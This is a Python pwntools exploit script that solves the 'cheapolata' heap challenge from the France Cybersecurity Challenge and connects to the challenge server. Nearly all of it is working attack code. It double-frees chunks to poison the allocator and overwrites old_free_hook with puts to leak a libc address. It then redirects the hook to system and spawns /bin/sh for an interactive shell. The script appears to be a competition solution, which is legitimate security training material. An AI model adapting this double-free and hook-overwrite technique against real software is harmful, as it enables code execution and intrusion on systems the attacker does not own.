from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./cheapolata_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define current
    x/10xg (void*)a-0x10
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2106)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)] # returns stuff between a & b

def alloc(size, data):
    sla(b"exit\n", b"1")
    sleep(speed)
    sl(str(size).encode())
    sleep(speed)
    if size == 0:
        return
    sl(data)
    sleep(speed)

def free():
    sla(b"exit\n", b"2")
    sleep(speed)

def quit():
    sla(b"exit\n", b"3")

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    sleep(speed)

    alloc(8, b"") # double free 0x20 sized chunk to later overwrite old_free_hook
    free()
    free()

    alloc(0x28, b"")# double free 0x20 sized chunk to overwrite old_free_hook
    free()
    free()
    alloc(0x28, p64(exe.sym["old_free_hook"]))
    alloc(0x28, b"")
    payload = flat([
        exe.plt["puts"], # old_free_hook -> puts@plt
        exe.sym["stderr"], # "a" -> address of stderr
    ])
    alloc(0x28, payload)
    free() # free(a) to leak stderr

    leak = recvu(b"free")
    leak = getb(leak, b">>> ", b"\n=====")
    libc.address = u64(leak) - 0x3ec680
    print("libc: %#018x" % libc.address)

    alloc(8, p64(exe.sym["old_free_hook"])) # overwrite old_free_hook with system()
    alloc(8, b"")
    alloc(8, p64(libc.sym["system"]))
    alloc(0x28, b"/bin/sh\0")
    free() # call system("/bin/sh")

    io.interactive()
    input("end")
    exit()

launch()
exploit()
